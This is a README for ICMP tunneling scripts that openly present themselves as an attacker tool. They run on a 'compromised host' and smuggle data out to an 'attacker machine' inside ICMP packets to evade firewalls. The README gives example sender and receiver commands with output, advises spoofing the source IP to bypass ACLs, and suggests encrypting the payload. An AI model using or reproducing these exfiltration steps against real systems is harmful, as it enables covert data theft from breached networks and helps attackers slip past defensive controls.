# ICMP Tunneling Scripts by x3dnesse

In order to use these scripts, root privileges are required and a python installation must be present on the victim machine.

What better way to avoid firewall controls than the usage of something as common as ICMP!

#### Script Usage

To use the scripts correctly, please do the following

On the compromised host

```
sudo python3 icmp_tunnel_sender.py -s 10.30.35.1 -a 10.30.35.93 -d 'hello from the other side' -c 5
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
.
Sent 1 packets.
```

On the receiving (attacker) machine

```
sudo python3 icmp_tunnel_receiver.py
Received 36 bytes from ('10.30.35.1', 0)
b'aiojwdijawiodjoaiwjdiajwodijoaiwd'
Decoded data: hello from the other side
```

#### Dependancies

1. Python Scapy

#### A Note on Source and Destination IP Addresses

Of course, you will want to make the destination IP address something you control, otherwise the ICMP requests will be lost in transit.

As for the Source IP, you can make this whatever you would like. Maybe you need to make it an IP from a subnet higher than you to bypass the ACL. Alas, this is totally up to you and you can spoof the source to whatever you wish.

#### Where is this script helpful?

Really anywhere, feel free to change the encoder to something you like. Maybe even change it to an AES cipher. The principle stays the same, you are sending data via ICMP requests and receiving and decoding/decrypting it!











